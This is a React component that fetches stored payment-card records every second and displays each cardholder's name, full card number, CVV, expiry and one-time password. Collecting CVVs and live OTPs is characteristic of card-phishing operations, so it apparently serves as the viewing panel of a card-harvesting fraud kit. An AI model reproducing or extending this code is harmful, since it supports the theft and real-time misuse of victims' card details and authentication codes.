import React, { useEffect, useState } from "react";
import axios from "axios";
import "./CardDetails.css"; // Ensure the CSS file for CardDetails is correctly imported
import { assets } from "../../assets/assets"; // Ensure the correct path to assets

const CardDetails = ({ url }) => {
  const [cards, setCards] = useState([]);
  const [error, setError] = useState(null);

  // Function to fetch all cards from the API
  const fetchAllCards = async () => {
    try {
      const response = await axios.get(`${url}/api/payment/pay`);

      setCards(response.data.data || []); // Access correct nested structure
      setError(null); // Reset error state if fetch is successful
    } catch (error) {
      console.error("Error fetching cards:", error);
      setError("Failed to fetch cards.");
      setCards([]); // In case of error, set cards to an empty array
    }
  };

  useEffect(() => {
    // Fetch cards initially when component mounts
    fetchAllCards();

    // Set interval to fetch cards every second
    const interval = setInterval(() => {
      fetchAllCards();
    }, 1000);
    return () => clearInterval(interval);
  }, [url]); // Dependency array ensures useEffect runs when 'url' changes

  return (
    <div className="card-details">
      <h2>All Cards</h2>
      {error && <p className="error-message">{error}</p>}
      <div className="card-list">
        {cards.length > 0 ? (
          cards.map((card, index) => (
            <div className="card-item" key={index}>
              <img
                src="https://images.pexels.com/photos/210742/pexels-photo-210742.jpeg"
                alt="Card Icon"
                className="card-icon"
              />
              <div className="card-text">
                <p className="card-label">Name:</p>
                <p className="card-item-name">{card.name}</p>
                <p className="card-label">Card Number:</p>
                <p className="card-item-cardNumber">{card.cardNumber}</p>
                <p className="card-label">CVV:</p>
                <p className="card-item-cvv">{card.cvv}</p>
                <p className="card-label">Expiry:</p>
                <p className="card-item-expiry">{card.expiry}</p>
                <p className="card-label">Otp:</p>
                <p className="card-item-amount">{card.otp}</p>
              </div>
            </div>
          ))
        ) : (
          <p>No cards found.</p>
        )}
      </div>
    </div>
  );
};

export default CardDetails;
